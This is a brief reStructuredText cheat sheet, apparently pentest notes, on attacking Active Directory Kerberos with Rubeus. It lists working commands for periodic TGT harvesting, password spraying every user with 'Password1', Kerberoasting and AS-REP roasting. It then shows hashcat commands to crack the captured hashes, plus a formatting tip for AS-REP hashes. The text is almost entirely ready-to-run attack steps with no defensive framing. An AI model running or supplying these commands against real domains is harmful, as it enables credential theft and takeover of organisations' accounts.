Rubeus information
***********************

Harvesting & Brute-Forcing Tickets w/ Rebeus
###############################################

Ttells Rubeus to harvest for TGTs every 30 seconds

.. code-block::console

        Rubeus.exe harvest /interval:30

Password Spray
++++++++++++++++

Add domain name to Windows /etc/hosts

.. code-block:: console

   echo <domainIP> <domainName> >> C:\Windows\System32\drivers\etc\hosts 

This will take a given password and "spray" it against all found users than give the .kirbi TGT for that user  

.. code-block:: console

   Rubeus.exe brute /password:Password1 /noticket

Kerberoating with Rubeus
###########################

.. code-block:: console

   Rubeus.exe kerberoast

You then grab the hash by copying it and use hashcat to exploit it.

.. code-block:: console

   hashcat -m 13100 -a 0 userhash.txt PASS.txt --force 

Dumping KRBASREP5 hashes
##########################

.. code-block:: console

        Rubeus.exe asreproast 

You then put the fouund hash in it's own respected file.

**NOTE Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User..... NOTE**

You then decrypt the hash with hashcat

.. code-block:: console

   hashcat -m 18200 Userhash.txt PASS.txt --force

